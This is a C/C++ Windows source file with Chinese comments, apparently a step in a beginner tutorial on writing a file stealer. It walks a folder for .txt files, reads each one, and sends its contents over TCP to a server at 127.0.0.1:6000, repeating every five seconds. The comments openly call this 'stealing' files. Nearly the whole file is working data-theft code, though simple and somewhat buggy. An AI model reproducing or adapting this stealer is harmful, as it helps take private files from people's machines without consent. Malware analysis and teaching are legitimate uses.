#define _CRT_SECURE_NO_WARNINGS

#include<stdio.h>
#include<windows.h>
#include<iostream>

#pragma comment(lib, "ws2_32.lib")

int SendtoServer(const char* path)
{
	// 1.初始化网络库
	//   1).加载套接字库
	WORD wVersionRequested;
	WSADATA wsadata;
	int err;
	char sendBuf[1024] = { 0 };

	wVersionRequested = MAKEWORD(2, 2);

	//	 2).初始化套接字库
	err = WSAStartup(wVersionRequested, &wsadata);
	if (err != 0)
	{
		printf("WSAStartup errorNum = %d\n", GetLastError());
		system("pause");
		return err;
	}
	if (LOBYTE(wsadata.wVersion) != 2 || HIBYTE(wsadata.wVersion) != 2)
	{
		printf("LOBYTE errorNum = %d\n", GetLastError());
		WSACleanup();
		system("pause");
		return -1;
	}

	// 2.安装电话机
	//   1).新建套接字
	SOCKET sockCli = socket(AF_INET, SOCK_STREAM, 0);
	if (INVALID_SOCKET == sockCli)
	{
		printf("socket errorNum = %d\n", GetLastError());
		system("pause");
		return -1;
	}

	//	 2).配置要连接的服务器
	SOCKADDR_IN addrSrv;
	addrSrv.sin_addr.S_un.S_addr = inet_addr("127.0.0.1"); // 配置本机IP地址 如果发生错误 则为10060
	addrSrv.sin_family = AF_INET;
	addrSrv.sin_port = htons(6000); // 配置本机端口号 如果发生错误 则为10061

	// 3.连接服务器
	if (SOCKET_ERROR == connect(sockCli, (SOCKADDR*)&addrSrv, sizeof(SOCKADDR)))
	{
		printf("connect errorNum = %d\n", GetLastError());
		system("pause");
		return -1;
	}
	
	// 4. 读取文件内容
	FILE* fp = fopen(path, "rb"); // 以只读的方式读取文件
	int len = fread(sendBuf, 1, 1024, fp); // 将fp所指向的文件中的内容读取1024大小的内容到sendBuf当中
	fclose(fp); // 关闭文件句柄
	// 5. 发送数据
	int iLen = send(sockCli, sendBuf, strlen(sendBuf) + 1, 0);
	if (iLen < 0)
	{
		printf("send errorNum = %d\n", GetLastError());
		system("pause");
		return -1;
	}

	//5. 关闭套接字连接
	closesocket(sockCli);
	WSACleanup();
	return 0;
}

int DoSteal(const char* szPath)
{
	// 1.  遍历szPath下的所有文件
	WIN32_FIND_DATA FindFileData; // FindFileData表示一个文件
	HANDLE hListFile; // 文件用句柄来标识， 就是一个编号

	char szFilePath[MAX_PATH] = { 0 }; // MAX_PATH 默认值是260
	strcpy(szFilePath, szPath); // 拷贝文件名
	strcat(szFilePath, "\\*"); // 使用通配符来匹配该文件夹下所有的文件
	// 2.  首先找到第一个文件,并返回他的句柄用于表示这个文件
	hListFile = FindFirstFile(szFilePath, &FindFileData); // 设置->配置属性->高级->高级属性->字符集->使用Unicode字符集
	// 3.  循环遍历所有文件
	do
	{
		char mypath[MAX_PATH] = { 0 };
		strcpy(mypath, szPath); // 拷贝文件路径
		strcat(mypath, FindFileData.cFileName); // 在路径后面附加文件名字 调用cFileName属性可以得到文件名
		if (strstr(mypath, ".txt")) // 如果是.txt文件
		{
			// 真正开始窃取文件
			SendtoServer(mypath); // 将得到的文件发送到服务器上
			printf("mypath = %s\n", mypath); // 打印出当前路径下所有文件名称
		}
	} while (FindNextFile(hListFile, &FindFileData)); //  FindFileData表示被找到的文件的信息
	return 0;
}

int main()
{
	printf("Steal\n");
	// 窃取文件 ("窃取哪一个文件呢？")
	while(1)
	{
		DoSteal("C:\\Users\\20613\\Desktop\\test\\"); //这里需要传入的是一个文件夹的路径,并且最后面必须是"\\"
		Sleep(5000);
	}
	// next ： 第二节
	system("pause");
	return 0;
}